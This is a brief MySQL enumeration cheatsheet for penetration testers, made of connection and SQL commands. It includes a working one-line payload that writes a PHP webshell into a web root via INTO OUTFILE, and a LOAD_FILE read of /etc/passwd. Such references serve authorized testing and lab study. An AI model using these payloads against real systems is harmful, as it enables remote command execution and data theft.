# MySQL Enumeration Cheatsheet

Enumerating MySQL services (port 3306).

## 1. Connect to MySQL (mysql)
Connect to a MySQL server.
```bash
mysql -u user -p'password' -h target.com
```
- `-u user`: Specify username.
- `-p'password'`: Specify password.
- `-h`: Target host.

## 2. Show MySQL Databases
List all available databases in MySQL.
```sql
SHOW DATABASES;
```

## 3. Select MySQL Database
Switch to a specific database in MySQL.
```sql
USE dbname;
```

## 4. Show MySQL Tables
List tables in the selected database in MySQL.
```sql
SHOW TABLES;
```

## 5. Select MySQL Table Data
Retrieve all entries from a table in MySQL.
```sql
SELECT * FROM users;
```

## 6. Write File in MySQL
Create a file (e.g., webshell) using MySQL (requires FILE privilege).
```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

## 7. Check MySQL File Privileges
Verify if secure_file_priv is empty for file operations.
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
- Empty output indicates read/write permissions in MySQL.
## 8. Check MySQL Operating System Version
Identify the operating system version running MySQL.
```sql
SELECT @@version_compile_os;
```
- Example output: `Win64` for Windows-based MySQL.

## 9. Read Local Files in MySQL
Read local files in MySQL (requires FILE privilege).
```sql
SELECT LOAD_FILE('/etc/passwd');
```
